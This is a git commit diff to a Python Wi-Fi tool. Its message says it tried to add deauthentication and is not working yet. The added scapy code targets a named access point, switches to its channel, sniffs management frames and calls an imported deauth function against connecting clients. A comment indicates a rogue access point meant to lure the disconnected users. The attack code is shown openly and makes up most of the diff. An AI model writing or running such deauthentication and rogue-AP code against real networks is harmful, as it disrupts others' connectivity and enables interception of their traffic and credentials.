1004f4bed7d46ee8f3774acfef9dc4e7485b2694
John Doe <johndoe@example.com>
2023-03-15 12:08:18 -0400

    Tried to add deauth - not working yet

--- wifitool/scan_networks/__main__.py
+++ wifitool/scan_networks/__main__.py
@@ -13,6 +13,8 @@
 # Let clients connect to our rogue AP
 
 from scanner import Scanner
+from deauth import deauth_clients, deauth
+from scapy.all import sendp, Dot11Elt, Dot11, RadioTap, Dot11Deauth, sniff
 
 INTERFACE = "wlan0"
 TIMEOUT = 5
@@ -20,22 +22,35 @@ TIMEOUT = 5
 AP_TO_ATTACK = "Sams 9"
 
 with Scanner(INTERFACE) as scanner:
-    AP_info = scanner.get_ap(timeout=TIMEOUT)
+    AP_info = scanner.get_ap(timeout=TIMEOUT, specific_ap=AP_TO_ATTACK)
     print(AP_info)
     print(scanner.wifis)
+    channel = AP_info.Channel[0]
+    BSSID = AP_info.index[0]
+    
+    # change channel to be on APs channel
+    scanner.set_channel(channel)
+    print(f"Channel is: {scanner.curr_channel}")
+    # Deauth clients
 
-# set_interface_to_monitor_mode(INTERFACE)
+    def check_deauth(pkt):
+        print("Recived package")
+        elt = pkt[Dot11Elt]
+        while elt and elt.ID != 0:
+            elt = elt.payload[Dot11Elt]
+        print(elt.info)
+        # if pkt[Dot11].addr1 == BSSID:
+        deauth(INTERFACE, BSSID, pkt[Dot11].addr2, 6)
 
-# AP_info = get_ap(timeout=TIMEOUT, interface=INTERFACE)#, specific_ap=AP_TO_ATTACK)
+    sniff(iface=INTERFACE, prn=check_deauth, filter="type mgt") #subtype assoc-req")  # start sniffin
 
-# print(AP_info)
+
 
 # channel = AP_info.Channel[0]
 # BSSID = AP_info.index[0]
 
 # print(AP_info.Channel)
 # print(BSSID[0])
-# # change channel to be on APs channel
 # os.system(f"iwconfig {INTERFACE} channel {channel}")
 # # clients = get_clients_on_ap(timeout=10, iface=INTERFACE, BSSID=BSSID)
 
